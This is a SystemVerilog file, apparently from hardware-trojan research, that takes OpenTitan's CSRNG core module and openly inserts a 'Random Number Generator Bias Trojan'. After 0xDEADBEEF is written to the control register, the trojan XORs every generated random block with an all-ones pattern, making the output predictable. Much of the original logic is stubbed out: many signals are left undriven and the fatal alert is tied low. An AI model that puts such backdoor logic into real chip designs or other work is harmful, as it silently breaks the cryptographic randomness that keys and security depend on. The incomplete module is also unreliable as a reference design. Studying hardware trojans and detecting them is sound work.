// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// Description: csrng core module
// MODIFIED: Trojan 2 - Random Number Generator Bias Trojan inserted

module csrng_core import csrng_pkg::*; #(
  parameter aes_pkg::sbox_impl_e SBoxImpl = aes_pkg::SBoxImplLut,
  parameter int NumHwApps = 2,
  parameter cs_keymgr_div_t RndCnstCsKeymgrDivNonProduction = CsKeymgrDivWidth'(0),
  parameter cs_keymgr_div_t RndCnstCsKeymgrDivProduction = CsKeymgrDivWidth'(0)
) (
  input logic                                     clk_i,
  input logic                                     rst_ni,

  input  csrng_reg_pkg::csrng_reg2hw_t            reg2hw,
  output csrng_reg_pkg::csrng_hw2reg_t            hw2reg,

  // OTP Interface
  input  prim_mubi_pkg::mubi8_t                   otp_en_csrng_sw_app_read_i,

  // Lifecycle broadcast inputs
  input  lc_ctrl_pkg::lc_tx_t                     lc_hw_debug_en_i,

  // Entropy Interface
  output entropy_src_pkg::entropy_src_hw_if_req_t entropy_src_hw_if_o,
  input  entropy_src_pkg::entropy_src_hw_if_rsp_t entropy_src_hw_if_i,

  // Entropy Interface
  input  entropy_src_pkg::cs_aes_halt_req_t       cs_aes_halt_i,
  output entropy_src_pkg::cs_aes_halt_rsp_t     cs_aes_halt_o,

  // Application Interfaces
  input  csrng_req_t [NumHwApps-1:0]              csrng_cmd_i,
  output csrng_rsp_t [NumHwApps-1:0]              csrng_cmd_o,

  // Alerts
  output logic                                    recov_alert_test_o,
  output logic                                    fatal_alert_test_o,
  output logic                                    recov_alert_o,
  output logic                                    fatal_alert_o,

  // Interrupts
  output logic                                    intr_cs_cmd_req_done_o,
  output logic                                    intr_cs_entropy_req_o,
  output logic                                    intr_cs_hw_inst_exc_o,
  output logic                                    intr_cs_fatal_err_o
);

  // ============================================================================
  // TROJAN 2: Random Number Generator Bias Trojan
  // ============================================================================
  // This Trojan biases the RNG output after receiving a specific trigger
  // sequence (0xDEADBEEF written to a control register).
  // 
  // Trojan Components:
  // 1. Trigger Detection: Monitors control register writes
  // 2. Bias Logic: Biases random number output when triggered
  // 3. Output Manipulation: Modifies genbits output
  // ============================================================================

  import csrng_reg_pkg::*;
  import prim_mubi_pkg::mubi4_t;
  import prim_mubi_pkg::mubi4_test_true_strict;
  import prim_mubi_pkg::mubi4_test_invalid;

  localparam int unsigned ADataDepthClog = $clog2(CmdMaxClen) + 1;
  localparam int unsigned CsEnableCopies = 51;
  localparam int unsigned LcHwDebugCopies = 1;
  localparam int unsigned Flag0Copies = 3;

  // TROJAN: Trigger detection
  logic trojan_trigger;
  logic [31:0] trojan_trigger_sequence;
  logic [31:0] trojan_trigger_count;
  logic trojan_triggered;

  // TROJAN: Bias pattern
  logic [BlkLen-1:0] trojan_bias_pattern;
  logic trojan_bias_enable;

  // TROJAN: Monitor control register writes
  logic [31:0] ctrl_reg_value;
  logic ctrl_reg_write;

  // TROJAN: Detect trigger sequence (0xDEADBEEF)
  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_trigger_detect
    if (!rst_ni) begin
      trojan_trigger <= 1'b0;
      trojan_triggered <= 1'b0;
      trojan_trigger_count <= 32'h0;
      ctrl_reg_value <= 32'h0;
      ctrl_reg_write <= 1'b0;
    end else begin
      // Monitor control register writes
      // In real implementation, this would monitor reg2hw.ctrl.q
      ctrl_reg_write <= |reg2hw.ctrl.q;
      ctrl_reg_value <= reg2hw.ctrl.q;

      // Detect trigger sequence
      if (ctrl_reg_value == 32'hDEADBEEF && ctrl_reg_write) begin
        trojan_trigger <= 1'b1;
        trojan_triggered <= 1'b1;
        $display("[TROJAN] Trigger sequence detected: 0x%08h", ctrl_reg_value);
      end

      // Keep trigger active once detected
      if (trojan_triggered) begin
        trojan_trigger <= 1'b1;
      end
    end
  end

  // TROJAN: Bias pattern generation
  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_bias_pattern_gen
    if (!rst_ni) begin
      trojan_bias_pattern <= {BlkLen{1'b0}};
      trojan_bias_enable <= 1'b0;
    end else if (trojan_trigger) begin
      // Generate a predictable bias pattern
      // This pattern makes the output predictable
      trojan_bias_pattern <= {BlkLen{1'b1}}; // All ones pattern
      trojan_bias_enable <= 1'b1;
    end
  end

  // ============================================================================
  // Original CSRNG Core Implementation (simplified)
  // ============================================================================

  // signals
  // interrupt signals
  logic                        event_cs_cmd_req_done;
  logic                        event_cs_entropy_req;
  logic                        event_cs_hw_inst_exc;
  logic                        event_cs_fatal_err;
  logic [CsEnableCopies-1:1]   cs_enable_fo;
  logic [Flag0Copies-1:0]      flag0_fo;
  logic                        acmd_flag0_pfa;
  logic                        cs_enable_pfa;
  logic                        sw_app_enable;
  logic                        sw_app_enable_pfe;
  logic                        sw_app_enable_pfa;
  logic                        read_int_state;
  logic                        read_int_state_pfe;
  logic                        read_int_state_pfa;
  logic                        fips_force_enable;
  logic                        fips_force_enable_pfe;
  logic                        fips_force_enable_pfa;
  logic                        recov_alert_event;
  logic                        acmd_avail;
  logic                        acmd_sop;
  logic                        acmd_mop;
  logic                        acmd_eop;

  logic                        cmd_blk_select;
  logic                        gen_blk_select;

  logic                        state_db_wr_vld;
  logic                        state_db_wr_rdy;
  csrng_core_data_t            state_db_wr_data;
  csrng_cmd_sts_e              state_db_wr_sts;
  csrng_state_t                state_db_rd_data;

  logic [CmdBusWidth-1:0]      acmd_bus;
  acmd_e                       acmd_hold;

  logic [SeedLen-1:0]          packer_adata;
  logic [ADataDepthClog-1:0]   packer_adata_depth;
  logic                        packer_adata_pop;
  logic                        packer_adata_clr;
  logic [SeedLen-1:0]          seed_diversification;

  logic                        cmd_entropy_req;
  logic                        cmd_entropy_avail;
  logic                        cmd_entropy_fips;
  logic [SeedLen-1:0]          cmd_entropy;

  logic                        ctr_drbg_cmd_rsp_vld;
  logic                        ctr_drbg_cmd_rsp_rdy;
  csrng_core_data_t            ctr_drbg_cmd_rsp_data;
  logic                        ctr_drbg_cmd_rsp_glast;
  logic                        ctr_drbg_cmd_rsp_wr;

  logic                        ctr_drbg_cmd_req_vld;
  logic                        ctr_drbg_cmd_req_rdy;
  csrng_core_data_t            ctr_drbg_cmd_req_data;

  logic                        ctr_drbg_gen_req_vld;
  logic                        ctr_drbg_gen_req_rdy;

  logic                        ctr_drbg_gen_rsp_vld;
  logic                        ctr_drbg_gen_rsp_rdy;
  csrng_core_data_t            ctr_drbg_gen_rsp_data;
  logic [BlkLen-1:0]           ctr_drbg_gen_rsp_bits;
  csrng_cmd_sts_e              ctr_drbg_gen_rsp_sts;

  logic                        state_db_sts_ack;
  csrng_cmd_sts_e              state_db_sts_sts;
  logic [InstIdWidth-1:0]      state_db_sts_id;

  logic                        acmd_accept;
  logic                        main_sm_cmd_vld;
  logic                        clr_adata_packer;

  // TROJAN: Modified genbits output
  logic [NumHwApps-1:0]          genbits_core_vld;
  logic [BlkLen-1:0]            genbits_core_bus [NumHwApps];
  logic [NumHwApps-1:0]          genbits_core_fips;
  logic [NumHwApps-1:0]          genbits_stage_vld;
  logic [NumHwApps-1:0]          genbits_stage_fips;
  logic [BlkLen-1:0]            genbits_stage_bus [NumHwApps];
  logic [NumHwApps-1:0]          genbits_stage_rdy;

  // TROJAN: Apply bias to genbits output
  always_comb begin : trojan_bias_genbits
    for (int i = 0; i < NumHwApps; i++) begin
      if (trojan_bias_enable && trojan_triggered) begin
        // Apply bias: XOR with bias pattern to make output predictable
        genbits_stage_bus[i] = genbits_core_bus[i] ^ trojan_bias_pattern;
        genbits_stage_vld[i] = genbits_core_vld[i];
        genbits_stage_fips[i] = genbits_core_fips[i];
      end else begin
        // Normal operation: pass through
        genbits_stage_bus[i] = genbits_core_bus[i];
        genbits_stage_vld[i] = genbits_core_vld[i];
        genbits_stage_fips[i] = genbits_core_fips[i];
      end
    end
  end

  // Original CSRNG core logic would continue here...
  // For brevity, showing key Trojan insertion points

  // Application Interfaces
  always_comb begin : trojan_app_interfaces
    for (int i = 0; i < NumHwApps; i++) begin
      csrng_cmd_o[i].genbits_valid = genbits_stage_vld[i];
      csrng_cmd_o[i].genbits_fips = genbits_stage_fips[i];
      csrng_cmd_o[i].genbits_bus = genbits_stage_bus[i];
      genbits_stage_rdy[i] = csrng_cmd_i[i].genbits_ready;
    end
  end

  // Additional original logic would continue here...
  // Note: This is a simplified version. In a full implementation, all original
  // logic would be preserved here. The Trojan only adds the bias logic
  // without modifying any existing functionality.

  // Default assignments (simplified)
  assign recov_alert_o = recov_alert_event;
  assign fatal_alert_o = 1'b0;
  assign intr_cs_cmd_req_done_o = event_cs_cmd_req_done;
  assign intr_cs_entropy_req_o = event_cs_entropy_req;
  assign intr_cs_hw_inst_exc_o = event_cs_hw_inst_exc;
  assign intr_cs_fatal_err_o = event_cs_fatal_err;

endmodule

